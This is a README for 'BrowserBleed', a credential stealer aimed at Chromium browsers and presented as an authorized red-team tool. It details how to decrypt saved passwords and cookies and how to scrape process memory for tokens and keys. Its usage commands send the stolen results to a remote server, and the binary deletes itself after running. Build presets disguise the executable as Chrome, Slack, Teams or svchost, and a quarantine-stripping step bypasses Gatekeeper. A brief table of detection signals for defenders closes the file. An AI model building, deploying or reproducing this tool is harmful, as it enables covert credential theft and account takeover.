# BrowserBleed

Authorized red team tool for extracting credentials, session tokens, and cookies from running Chromium-based browsers. Supports Windows (`BrowserBleed.py` / `BrowserBleed.exe`) and macOS (`BrowserBleed_mac.py` / `BrowserBleed_mac`).

> **For authorized use only.** Only run against systems you own or have explicit written permission to test.

---

## Attack Overview

Modern browsers hold decrypted credentials, session tokens, JWTs, and auth cookies entirely in process memory during an active session. An attacker or red teamer with local administrator access (Windows) or root (macOS) can read the virtual address space of every browser process, extract live credentials without touching disk, and use them to impersonate the victim across any service whose tokens appear in memory — regardless of whether the user's disk is encrypted.

This attack is effective against:
- Corporate SSO sessions (Okta, Azure AD, Google Workspace)
- OAuth2 access and refresh tokens
- API keys stored by web apps (GitHub, Anthropic, OpenAI, Slack, HuggingFace, Stripe, npm)
- AWS access keys and session tokens
- Session cookies protected by HttpOnly and Secure flags (bypassed because we read them from memory, not the network)
- SSH private keys resident in memory

---

## How Each Script Works

### Windows — `BrowserBleed.py`

**Prerequisites:** Run as Administrator. Built with `--uac-admin` so Windows auto-elevates on launch.

#### 1. Disk Extraction

Chrome encrypts saved passwords and cookies on disk using **AES-256-GCM** with a master key protected by Windows **DPAPI** (`CryptUnprotectData`). Because we run as the same user, DPAPI decrypts transparently:

1. Read `Local State` JSON → base64-decode the encrypted master key blob
2. Call `CryptUnprotectData` (via `ctypes.windll.crypt32`) to unwrap the master key
3. Open `Login Data` (SQLite) → decrypt each `password_value` with AES-256-GCM using the master key
4. Open `Network/Cookies` (SQLite) → same decryption path for each cookie value

Chrome locks the Cookies file while running. Fallback: **VSS (Volume Shadow Copy)** snapshot to read a consistent copy of the locked file without touching Chrome's file handle.

Multi-profile aware: enumerates `Default`, `Profile 1`–`Profile 19`, and `Guest Profile` per browser.

#### 2. CDP Cookie Extraction

When Chrome is running, BrowserBleed always attempts **Chrome DevTools Protocol** cookie extraction alongside disk extraction. CDP surfaces session-only and HttpOnly cookies that never touch disk. Results are merged with disk cookies (deduped by host+name); CDP-only entries are labeled.

#### 3. Memory Scraping

For each Chrome PID (all processes — renderer, GPU, network service, browser):

1. `OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)` → get a handle
2. `VirtualQueryEx` → walk the virtual address space, enumerate all `MEM_COMMIT` regions that aren't `PAGE_NOACCESS`, `PAGE_GUARD`, or `MEM_IMAGE` (DLL/EXE code sections — skipped; no credentials live there)
3. **Pre-filter**: before running any regex, check each 64 KB chunk for known credential prefixes (`eyJ`, `Bearer `, `ghp_`, `sk-ant-`, `AKIA`, `-----BEGIN`, etc.) using C-speed `bytes.__contains__`. Skips ~85% of Chrome memory without regex overhead.
4. `ReadProcessMemory` → read each qualifying region in **64 KB chunks** (vs. 4 KB previously — 16× fewer syscalls)
5. Scan each chunk with `CREDENTIAL_PATTERNS` (20 regex patterns covering JWTs, Bearer tokens, OAuth tokens, API keys, session tokens, session IDs, cookies, passwords, SSH private keys)
6. **512-byte overlap**: retain the last 512 bytes of each chunk and prepend to the next. Prevents credentials split across chunk boundaries from being missed.
7. PIDs scraped in parallel via `ThreadPoolExecutor` (up to 8 workers)

#### 4. PID → Site Attribution

Chrome renderer processes expose `--site-instance-site=https://...` in their command line (one renderer per site origin under strict site isolation). A single `Get-WmiObject Win32_Process` batch query retrieves all Chrome command lines at once, building a `pid → site_url` map. The site URL is injected into each hit's context for service identification.

#### 5. Deduplication

Two-pass dedup:
1. **Prefix key**: group hits by `label:value[:50]` to collapse near-identical captures of the same token
2. **Prefix collapse**: within each label group, if a shorter value is a prefix of a longer one, keep the longer (handles chunk-boundary truncations)

#### 6. Service Identification

Each hit passes through a 6-level identification chain:

| Priority | Method | Example |
|----------|--------|---------|
| 1 | Token prefix patterns | `ya29.` → Google OAuth2, `ghp_` → GitHub |
| 2 | JWT header `kid` patterns | `key-\d+` → Google (empirical) |
| 3 | JWT `iss`/`aud` claims vs `_ISS_MAP` | `github.com` in iss → GitHub |
| 4 | OIDC discovery | Fetch `<iss>/.well-known/openid-configuration` |
| 5 | JWT claim URL scan | `redirect_uri` value → service domain |
| 6 | Context window byte scan | `Host: api.slack.com` near the token in memory |

#### 7. Token Verification (`--verify`)

Makes live outbound requests to verify token validity:

| Service | Endpoint |
|---------|----------|
| Google OAuth2 | `oauth2.googleapis.com/tokeninfo` |
| GitHub | `api.github.com/user` |
| Slack | `slack.com/api/auth.test` |
| Anthropic | `api.anthropic.com/v1/models` |
| OpenAI | `api.openai.com/v1/models` |
| Stripe | `api.stripe.com/v1/account` |
| AWS | `sts.amazonaws.com` (GetCallerIdentity) |
| JWT (generic) | Local `exp` claim check |

---

### macOS — `BrowserBleed_mac.py`

**Prerequisites:** Run as root (`sudo`). `task_for_pid` requires root or the `com.apple.security.cs.debugger` entitlement.

#### 1. Disk Extraction

Chrome on macOS encrypts cookies/passwords using **AES-128-CBC** with a key derived from a password stored in the **macOS Keychain**:

1. `security find-generic-password -w -s "Chrome Safe Storage" -a "Chrome"` → retrieve the Keychain password
2. Derive a 16-byte AES key: `PBKDF2-HMAC-SHA1(password, salt=b"saltysalt", iterations=1003, dklen=16)`
3. Decrypt each `v10`-prefixed value: strip the 3-byte `v10` prefix, use a fixed IV of 16 space bytes (`b" " * 16`), AES-128-CBC decrypt, strip PKCS#7 padding

Multi-profile aware: enumerates `Default`, `Profile 1`–`Profile 19`, and `Guest Profile` per browser.

Chrome v20+ uses app-bound encryption for cookies — these are labeled in output but not decryptable from outside the browser process.

#### 2. CDP Cookie Extraction

Same as Windows: attempts DevTools Protocol extraction when browser is running, merges with disk results, labels CDP-only entries.

#### 3. Memory Scraping

For each Chrome PID:

1. `task_for_pid(mach_task_self(), pid, &task)` → obtain a Mach task port for the target process
2. `mach_vm_region(task, &addr, &size, VM_REGION_BASIC_INFO_64, ...)` → iterate all readable memory regions (`VM_PROT_READ`)
3. **Pre-filter**: same C-speed prefix scan as Windows before running regex
4. `mach_vm_read_overwrite` → read each qualifying region in **64 KB chunks**
5. **512-byte overlap** between chunks
6. Same 20-pattern `CREDENTIAL_PATTERNS` scanning as Windows
7. PIDs scraped in parallel via `ThreadPoolExecutor` (up to 8 workers)

#### 4. PID → Site Attribution

Uses `ps -ww -A` to read Chrome process command lines and extract `--site-instance-site=URL` — same logic as Windows.

#### 5–7. Deduplication, Identification, and Verification

Identical to Windows: same two-pass dedup, same `_DOMAIN_SVC`, `_ISS_MAP`, `_KID_MAP`, OIDC discovery, context scanning, and verifiers.

---

## Output

Both versions write two files to the same directory as the binary:

| File | Contents |
|------|----------|
| `bb_results.txt` | Human-readable report. Memory hits formatted as an aligned flat table sorted by credential tier (high-value first). Values truncated at 80 chars for readability. Session IDs and Cookie headers collapsed to a count summary. |
| `bb_results.csv` | Full untruncated values for all memory hits. Columns: `browser, profile, label, service, value, address`. Import directly into Excel or Sheets for sorting/filtering. |

---

## Usage

When built with a report server baked in (see [Building your own binaries](#building-your-own-binaries)), just drop and run — no flags needed. Results upload automatically and the binary removes itself.

**Default behaviour when a server is baked in:**
1. Moves itself from the drop location into `%TEMP%` within ~2 seconds — gone from Explorer immediately
2. Scans all browsers (disk + memory), exfils results to your server
3. Deletes the `%TEMP%` copy 120 seconds after launch
4. No local files left anywhere on the target

### Windows

```
chrome_crashpad_handler.exe             # drop and run — exfils, vanishes
chrome_crashpad_handler.exe --no-self-delete   # keep the binary for testing
chrome_crashpad_handler.exe --out results.txt  # also write a local file
chrome_crashpad_handler.exe --browser chrome   # target one browser only
chrome_crashpad_handler.exe --memory-only      # skip disk extraction
chrome_crashpad_handler.exe --disk-only        # skip memory scraping
chrome_crashpad_handler.exe --verify           # verify tokens (outbound requests)
chrome_crashpad_handler.exe --max-hits 500     # raise memory hit cap (default: 300)
```

When running from source (no server baked in):
```
python BrowserBleed.py --exfil https://your-server.com --exfil-key YOUR_API_KEY
```

### macOS

```bash
sudo ./BrowserBleed_mac                        # drop and run — exfils, self-deletes
sudo ./BrowserBleed_mac --no-self-delete       # keep the binary for testing
sudo ./BrowserBleed_mac --out /tmp/results.txt # also write a local file
sudo ./BrowserBleed_mac --browser chrome       # target one browser only
sudo ./BrowserBleed_mac --memory-only          # skip disk extraction
sudo ./BrowserBleed_mac --disk-only            # skip memory scraping
sudo ./BrowserBleed_mac --verify               # verify tokens (outbound requests)
sudo ./BrowserBleed_mac --max-hits 500         # raise memory hit cap (default: 300)
```

When running from source:
```bash
sudo python3 BrowserBleed_mac.py --exfil https://your-server.com --exfil-key YOUR_API_KEY
```

---

## Report Server

BrowserBleed includes an optional self-hosted report server (`server/`) for receiving and viewing results from remote engagements. When `--exfil` is used, BrowserBleed POSTs the `.txt` and `.csv` to the server after the run; the report URL is appended to `bb_results.txt`.

### Security model

The server is designed to handle highly sensitive data. Three layers of protection are applied:

| Layer | Mechanism |
|-------|-----------|
| **Encryption at rest** | Every report is encrypted with AES-256-GCM before touching disk. A separate `ENCRYPTION_KEY` (distinct from the API key) is used. `.enc` files only — no plaintext ever written. `meta.json` (hostname, timestamps, hit count — no credential values) is stored unencrypted for index building. |
| **Auth** | Browser access via `POST /login` form → HttpOnly session cookie (no query params, never in logs). Programmatic upload via `Authorization: Bearer` header only. `/login` has `access_log off` in nginx so the key is never logged. |
| **Auto-expiry** | Reports are deleted after a configurable TTL (default 24h). A background goroutine runs every 15 minutes. Expiry time is shown in the report view. |

> **Honest limitation:** If the EC2 is fully compromised with root access, an attacker can read `ENCRYPTION_KEY` from `/opt/bb-reports/.env` and decrypt stored reports. The TTL limits the blast radius to whatever was uploaded in the last day.

### Deploying the report server

Prerequisites: AWS CLI authenticated, Route 53 hosted zone for your domain, Go 1.22+.

```bash
# 1. Configure your deployment
cp deploy/config.example deploy/config
# Edit deploy/config with your domain, email, region, etc.

# 2. Spin up the EC2 instance
bash deploy/provision.sh

# 3. Wait ~60s, then configure nginx + TLS
bash deploy/setup-server.sh

# 4. Build and deploy the server binary (prompts for secrets on first run)
bash deploy/deploy-binary.sh
```

`deploy-binary.sh` prompts for four secrets on first deploy and writes them to `/opt/bb-reports/.env` (mode 600) on the server:

| Variable | Purpose |
|----------|---------|
| `API_KEY` | Shared between BrowserBleed `--exfil-key` and the browser login form |
| `ENCRYPTION_KEY` | 64-char hex AES-256 key — generate with `openssl rand -hex 32` |
| `BASE_URL` | Public URL of the server (e.g. `https://reports.yourdomain.com`) |
| `REPORT_TTL` | How long reports are kept (e.g. `24h`, `72h`) |

To update the binary after code changes:
```bash
bash deploy/deploy-binary.sh   # rebuilds, uploads, restarts service
```

---

## Building your own binaries

Binaries are **not distributed** — you build your own with your report server baked in. This keeps your server URL and API key out of any shared binary and off GitHub.

### Prerequisites

```
pip install cryptography pyinstaller   # Windows (PowerShell)
pip3 install cryptography pyinstaller  # macOS
```

Go 1.22+ is required only to build the report server binary.

### Step 1 — Deploy the report server

Follow the [Report Server](#report-server) deploy steps above. When done, `deploy/config` will contain your `DOMAIN` and `BB_API_KEY`.

### Step 2 — Build for Windows

```powershell
.\build_windows.ps1
```

Reads `DOMAIN` and `BB_API_KEY` from `deploy/config`, substitutes them into a temp copy of the source, and produces the exe in the repo root. The exe auto-exfils on every run — no flags needed on target.

**Disguising the binary** — use `-Preset` to pick a disguise, or run without arguments for an interactive menu:

```powershell
.\build_windows.ps1           # interactive menu to pick a preset
.\build_windows.ps1 -Preset chrome
.\build_windows.ps1 -Preset slack
.\build_windows.ps1 -Preset teams
```

Available presets (set exe name, process name, icon, and Properties metadata automatically):

| # | Preset | Exe name | Appears as |
|---|--------|----------|------------|
| 1 | `chrome` | `chrome_crashpad_handler.exe` | Google LLC — Google Chrome |
| 2 | `edge` | `msedge_crashpad_handler.exe` | Microsoft Corporation — Microsoft Edge |
| 3 | `brave` | `brave_crashpad_handler.exe` | Brave Software, Inc — Brave Browser |
| 4 | `firefox` | `plugin-container.exe` | Mozilla Corporation — Mozilla Firefox |
| 5 | `opera` | `opera_crashpad_handler.exe` | Opera Software AS — Opera internet browser |
| 6 | `slack` | `slack.exe` | Slack Technologies, Inc. — Slack |
| 7 | `discord` | `Discord.exe` | Discord Inc. — Discord |
| 8 | `teams` | `ms-teams.exe` | Microsoft Corporation — Microsoft Teams |
| 9 | `zoom` | `Zoom.exe` | Zoom Video Communications, Inc. — Zoom |
| 10 | `whatsapp` | `WhatsApp.exe` | WhatsApp LLC — WhatsApp |
| 11 | `telegram` | `Telegram.exe` | Telegram FZ-LLC — Telegram Desktop |

Icons are pulled automatically from the app's install path if it's installed on the build machine. If the app isn't installed, the binary is built without a custom icon.

**Full manual override** (for any process name not in the presets):

```powershell
.\build_windows.ps1 `
    -ExeName svchost `
    -Company "Microsoft Corporation" `
    -FileDesc "Host Process for Windows Services" `
    -IconFile "C:\Windows\System32\svchost.exe" `
    -ExfilUrl https://reports.example.com `
    -ExfilKey mykey
```

### Step 3 — Build for macOS

```bash
chmod +x build_mac.sh && ./build_mac.sh
```

Same substitution via `sed`, produces `BrowserBleed_mac`. The build script also strips the Gatekeeper quarantine attribute automatically. If you move or re-download the binary:
```bash
xattr -dr com.apple.quarantine BrowserBleed_mac
```

To override:
```bash
EXFIL_URL=https://reports.example.com EXFIL_KEY=mykey ./build_mac.sh
```

### Dropping on a target

Drop the built exe anywhere writable on the target and run it. The filename is whatever preset you chose — `chrome_crashpad_handler.exe`, `slack.exe`, etc.

```
chrome_crashpad_handler.exe   # Windows — exfils, moves itself to %TEMP%, self-deletes
sudo ./BrowserBleed_mac       # macOS — exfils, self-deletes
```

View results at your report server after logging in with the API key.

**Testing locally:** use `--no-self-delete` to keep the binary so you can run it more than once:
```powershell
.\chrome_crashpad_handler.exe --no-self-delete
```

### Rebuilding after source changes

Re-run the build script — it always patches a temp copy, so the source files stay clean (no credentials in the `.py` files ever):
```powershell
.\build_windows.ps1 -Preset chrome   # or whichever preset you use
```

### Report server binary (local dev/test)

```bash
cd server
go run ./cmd/server -- --api-key testkey --enc-key $(openssl rand -hex 32) --data-dir /tmp/bb-data --base-url http://localhost:8080
```

---

## Supported Browsers

Chrome, Edge, Brave, Vivaldi, Opera, Opera GX, Chromium

Firefox: unencrypted cookies extracted (login decryption not yet implemented).

---

## Detection Opportunities

For blue teamers: this tool generates detectable signals at each stage.

| Stage | Signal |
|-------|--------|
| Memory read | `OpenProcess` / `task_for_pid` calls from a non-browser process targeting Chrome PIDs |
| VSS access (Windows) | `IVssBackupComponents::InitializeForBackup` from a non-backup process |
| Disk credential read | SQLite open on `Login Data` / `Cookies` from a process that isn't Chrome |
| CDP connection | WebSocket connection to `localhost:9222` from a non-browser process |
| Outbound verification | HTTP requests to `oauth2.googleapis.com/tokeninfo`, `api.github.com/user`, `slack.com/api/auth.test`, `api.anthropic.com/v1/models` from a non-browser process |
| OIDC discovery | Unexpected `GET /.well-known/openid-configuration` from a non-browser process |

EDR products with process injection detection (CrowdStrike, SentinelOne, Defender for Endpoint) will typically alert on cross-process `ReadProcessMemory` / `task_for_pid` targeting a browser.
